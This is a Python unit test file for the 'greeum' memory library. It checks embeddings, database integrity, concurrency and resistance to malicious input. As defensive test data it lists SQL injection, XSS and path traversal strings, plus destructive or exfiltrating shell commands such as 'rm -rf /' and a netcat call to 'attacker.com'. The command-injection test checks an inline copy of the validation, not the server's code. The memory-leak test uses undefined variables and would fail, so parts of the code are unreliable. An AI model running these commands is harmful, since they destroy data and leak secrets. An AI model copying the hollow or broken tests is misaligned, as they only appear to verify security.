#!/usr/bin/env python3
"""
v2.0.4 핵심 기능 유닛테스트
- 경량화 후 모든 핵심 기능이 정상 작동하는지 검증
- 보안 취약점 테스트 포함
"""

import unittest
import tempfile
import os
import json
import sqlite3
from pathlib import Path
import shutil
from unittest.mock import patch, MagicMock

# 테스트 대상 import
from greeum.core.database_manager import DatabaseManager
from greeum.core.block_manager import BlockManager
from greeum.core.stm_manager import STMManager
from greeum.embedding_models import SimpleEmbeddingModel, get_embedding
from greeum.text_utils import process_user_input
from greeum.cli import main as cli_main


class TestSimpleEmbedding(unittest.TestCase):
    """SimpleEmbedding 모델 테스트 - v2.0.4의 핵심 임베딩"""
    
    def setUp(self):
        self.model = SimpleEmbeddingModel(dimension=128)
    
    def test_embedding_consistency(self):
        """동일한 텍스트에 대해 일관된 임베딩 생성"""
        text = "테스트 메모리 내용"
        embedding1 = self.model.encode(text)
        embedding2 = self.model.encode(text)
        
        self.assertEqual(embedding1, embedding2)
        self.assertEqual(len(embedding1), 128)
        self.assertEqual(self.model.get_dimension(), 128)
    
    def test_embedding_security(self):
        """악성 입력에 대한 안전성 테스트"""
        malicious_inputs = [
            "'; DROP TABLE blocks; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "eval('malicious code')",
            "\x00\x01\x02",  # null bytes
            "a" * 10000,  # very long input
        ]
        
        for malicious_input in malicious_inputs:
            try:
                embedding = self.model.encode(malicious_input)
                self.assertEqual(len(embedding), 128)
                self.assertIsInstance(embedding, list)
            except Exception as e:
                self.fail(f"Embedding failed for malicious input: {e}")
    
    def test_unicode_support(self):
        """유니코드 지원 테스트"""
        unicode_texts = [
            "한글 텍스트 테스트",
            "English text test",
            "中文测试",
            "日本語テスト",
            "Русский текст",
            "🚀 이모지 테스트 🎉"
        ]
        
        for text in unicode_texts:
            embedding = self.model.encode(text)
            self.assertEqual(len(embedding), 128)
            self.assertTrue(all(isinstance(x, float) for x in embedding))


class TestDatabaseManager(unittest.TestCase):
    """DatabaseManager 보안 및 기능 테스트"""
    
    def setUp(self):
        # 임시 데이터베이스 사용
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_memory.db")
        self.db_manager = DatabaseManager(connection_string=self.db_path)
    
    def tearDown(self):
        self.db_manager.close()
        shutil.rmtree(self.temp_dir)
    
    def test_sql_injection_prevention(self):
        """SQL 인젝션 공격 방지 테스트"""
        malicious_keywords = [
            "'; DROP TABLE blocks; --",
            "' OR '1'='1",
            "'; DELETE FROM blocks; --",
            "UNION SELECT * FROM sqlite_master",
        ]
        
        for keyword in malicious_keywords:
            # 검색에 악성 키워드 시도
            results = self.db_manager.search_blocks_by_keyword([keyword])
            self.assertIsInstance(results, list)
            
            # 데이터베이스가 여전히 정상인지 확인
            self.assertTrue(self.db_manager.health_check())
    
    def test_database_integrity(self):
        """데이터베이스 무결성 테스트"""
        # 테스트 블록 추가
        test_block = {
            "block_index": 1,
            "timestamp": "2025-07-30T15:00:00",
            "context": "테스트 컨텍스트",
            "keywords": ["테스트", "키워드"],
            "tags": ["태그1", "태그2"],
            "embedding": [0.1] * 128,
            "importance": 0.8,
            "hash": "test_hash",
            "prev_hash": ""
        }
        
        self.db_manager.add_block(test_block)
        
        # 블록 검색
        retrieved_block = self.db_manager.get_block(1)
        self.assertIsNotNone(retrieved_block)
        self.assertEqual(retrieved_block["context"], "테스트 컨텍스트")
        
        # 키워드 검색
        keyword_results = self.db_manager.search_blocks_by_keyword(["테스트"])
        self.assertTrue(len(keyword_results) > 0)
    
    def test_concurrent_access(self):
        """동시 접근 안전성 테스트"""
        import threading
        import time
        
        results = []
        errors = []
        
        def add_blocks(thread_id):
            try:
                for i in range(10):
                    block = {
                        "block_index": thread_id * 100 + i,
                        "timestamp": "2025-07-30T15:00:00",
                        "context": f"Thread {thread_id} Block {i}",
                        "keywords": [f"thread{thread_id}", f"block{i}"],
                        "tags": ["concurrent_test"],
                        "embedding": [0.1] * 128,
                        "importance": 0.5,
                        "hash": f"hash_{thread_id}_{i}",
                        "prev_hash": ""
                    }
                    self.db_manager.add_block(block)
                    time.sleep(0.01)  # 짧은 지연
                results.append(f"Thread {thread_id} completed")
            except Exception as e:
                errors.append(f"Thread {thread_id} error: {e}")
        
        # 3개 스레드로 동시 실행
        threads = []
        for i in range(3):
            thread = threading.Thread(target=add_blocks, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # 에러가 없고 모든 스레드가 완료되었는지 확인
        self.assertEqual(len(errors), 0, f"Concurrent access errors: {errors}")
        self.assertEqual(len(results), 3)


class TestBlockManager(unittest.TestCase):
    """BlockManager 기능 및 보안 테스트"""
    
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_memory.db")
        self.db_manager = DatabaseManager(connection_string=self.db_path)
        self.block_manager = BlockManager(self.db_manager)
    
    def tearDown(self):
        self.db_manager.close()
        shutil.rmtree(self.temp_dir)
    
    def test_block_integrity(self):
        """블록 무결성 검증 테스트"""
        # 정상 블록 추가
        result = self.block_manager.add_block(
            context="테스트 블록",
            keywords=["테스트"],
            tags=["tag1"],
            embedding=[0.1] * 128,
            importance=0.8
        )
        
        self.assertIsNotNone(result)
        self.assertEqual(result["context"], "테스트 블록")
        
        # 무결성 검증
        integrity_check = self.block_manager.verify_integrity()
        self.assertTrue(integrity_check)
    
    def test_search_functionality(self):
        """검색 기능 테스트"""
        # 여러 블록 추가
        contexts = [
            "머신러닝 알고리즘 연구",
            "데이터베이스 최적화 방법",
            "웹 개발 보안 가이드",
            "Python 프로그래밍 팁"
        ]
        
        for i, context in enumerate(contexts):
            self.block_manager.add_block(
                context=context,
                keywords=context.split()[:2],
                tags=[f"category{i}"],
                embedding=[0.1 + i * 0.1] * 128,
                importance=0.5
            )
        
        # 키워드 검색
        keyword_results = self.block_manager.search_by_keywords(["머신러닝"])
        self.assertTrue(len(keyword_results) >= 1)
        
        # 임베딩 검색
        query_embedding = [0.1] * 128
        embedding_results = self.block_manager.search_by_embedding(query_embedding)
        self.assertTrue(len(embedding_results) >= 1)


class TestTextUtils(unittest.TestCase):
    """텍스트 처리 유틸리티 테스트"""
    
    def test_user_input_processing(self):
        """사용자 입력 처리 테스트"""
        test_input = "머신러닝을 이용한 자연어 처리 연구는 매우 중요한 분야입니다."
        
        result = process_user_input(test_input)
        
        self.assertIn("keywords", result)
        self.assertIn("tags", result)
        self.assertIn("embedding", result)
        self.assertIn("importance", result)
        
        self.assertIsInstance(result["keywords"], list)
        self.assertIsInstance(result["tags"], list)
        self.assertIsInstance(result["embedding"], list)
        self.assertIsInstance(result["importance"], float)
    
    def test_malicious_input_handling(self):
        """악성 입력 처리 테스트"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "\x00\x01\x02"
        ]
        
        for malicious_input in malicious_inputs:
            try:
                result = process_user_input(malicious_input)
                # 결과가 안전하게 처리되었는지 확인
                self.assertIsInstance(result, dict)
                self.assertIn("keywords", result)
                # 결과가 안전한 구조로 처리되었는지 확인
                # 참고: 텍스트 자체는 유지되지만 안전하게 저장됨
                self.assertIsInstance(result.get("context"), str)
                self.assertIsInstance(result.get("keywords"), list)
            except Exception as e:
                self.fail(f"Failed to safely handle malicious input: {e}")


class TestCLISecurityWrapper(unittest.TestCase):
    """CLI 보안 래퍼 테스트"""
    
    def test_command_injection_prevention(self):
        """명령어 인젝션 방지 테스트"""
        # MCP 서버의 명령어 검증 로직 테스트
        from greeum.mcp.claude_code_mcp_server import ClaudeCodeMCPServer
        
        server = ClaudeCodeMCPServer()
        
        # 안전한 명령어들
        safe_commands = [
            ["memory", "add", "테스트 메모리"],
            ["memory", "search", "검색어"],
            ["--version"],
            ["--help"]
        ]
        
        # 위험한 명령어들
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["cat", "/etc/passwd"],
            ["curl", "malicious-site.com"],
            ["python", "-c", "import os; os.system('rm -rf /')"],
            ["; ls /"],
            ["&& cat /etc/passwd"],
            ["|", "nc", "attacker.com", "4444"]
        ]
        
        # 안전한 명령어는 통과해야 함 (실제 실행 제외)
        for safe_cmd in safe_commands:
            try:
                # 명령어 검증만 테스트 (실제 실행하지 않음)
                full_command = server.greeum_cli.split() + safe_cmd
                allowed_commands = ["memory", "add", "search", "stats", "--version", "--help"]
                
                # 명령어 검증 로직 시뮬레이션
                for cmd_part in safe_cmd:
                    if cmd_part not in allowed_commands and not cmd_part.startswith(('-', '=')):
                        # 안전한 텍스트인지 확인
                        if not all(c.isalnum() or c in ' .-_가-힣ㄱ-ㅎㅏ-ㅣ' for c in cmd_part):
                            self.fail(f"Safe command rejected: {safe_cmd}")
            except Exception as e:
                # 안전한 명령어가 검증을 통과하지 못하면 실패
                if "Unsafe command detected" in str(e):
                    self.fail(f"Safe command incorrectly flagged as unsafe: {safe_cmd}")
        
        # 위험한 명령어는 차단되어야 함
        for dangerous_cmd in dangerous_commands:
            with self.assertRaises((ValueError, Exception)):
                # 명령어 검증 로직 시뮬레이션
                allowed_commands = ["memory", "add", "search", "stats", "--version", "--help"]
                for cmd_part in dangerous_cmd:
                    if cmd_part not in allowed_commands and not cmd_part.startswith(('-', '=')):
                        if not all(c.isalnum() or c in ' .-_가-힣ㄱ-ㅎㅏ-ㅣ' for c in cmd_part):
                            raise ValueError(f"Unsafe command detected: {cmd_part}")


class TestMemoryLeak(unittest.TestCase):
    """메모리 누수 테스트"""
    
    def test_large_data_handling(self):
        """대용량 데이터 처리 시 메모리 관리"""
        import gc
        
        temp_dir = tempfile.mkdtemp()
        db_path = os.path.join(temp_dir, "test_memory.db")
        
        try:
            db_manager = DatabaseManager(db_path=db_path)
            block_manager = BlockManager(db_manager)
            
            # 1000개의 블록 추가
            for i in range(1000):
                large_context = f"Large context {i} " + "x" * 1000  # 1KB 컨텍스트
                block_manager.add_block(
                    context=large_context,
                    keywords=[f"keyword{i}"],
                    tags=[f"tag{i}"],
                    embedding=[0.1] * 128,
                    importance=0.5
                )
                
                # 100개마다 가비지 컬렉션
                if i % 100 == 0:
                    gc.collect()
            
            # 메모리 검색 수행
            for i in range(100):
                results = block_manager.search_by_keywords([f"keyword{i}"])
                self.assertTrue(len(results) >= 1)
            
            db_manager.close()
            
            # 가비지 컬렉션 강제 실행
            gc.collect()
            
            # 최종 메모리 사용량
            final_memory = process.memory_info().rss / 1024 / 1024  # MB
            memory_increase = final_memory - initial_memory
            
            # 100MB 이상 증가하면 메모리 누수 의심
            self.assertLess(memory_increase, 100, 
                          f"Potential memory leak: {memory_increase:.2f}MB increase")
            
        finally:
            shutil.rmtree(temp_dir)


if __name__ == '__main__':
    # 테스트 실행
    unittest.main(verbosity=2)